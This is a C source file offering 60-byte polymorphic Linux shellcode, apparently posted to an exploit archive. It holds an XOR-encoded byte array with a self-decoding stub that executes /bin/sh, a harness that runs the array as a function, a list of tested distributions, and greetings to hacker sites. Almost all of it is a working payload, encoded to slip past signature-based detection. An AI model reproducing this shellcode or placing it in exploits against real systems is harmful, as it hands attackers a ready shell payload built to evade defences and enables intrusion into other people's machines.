/*
 * sys_execve("/bin/sh", { "/bin/sh", NULL }, NULL) 60 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char encoded_1[] = "\xeb\x0d\x5e\x31\xc9\xb1\x28\x80\x36\x29"
		   "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
		   "\x18\xe9\x99\x3e\xe4\xa9\xaa\xc5\x28\xa1"
		   "\x2d\x0d\x41\x06\x06\x5a\x41\x41\x06\x4b"
		   "\x40\x47\xa0\xca\x18\xe9\x79\x7a\x99\x22"
		   "\xa0\xc8\xe4\xa9\x18\xe9\x99\x28\xe4\xa9";

int main(void) {
	int ret_len = strlen(encoded_1);
	printf("[+] Using mutation key engine : 0x29\n");
	printf("[+] Length of this shellcode is : %d bytes\n", ret_len);
	(*(void(*)())encoded_1)();
	return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */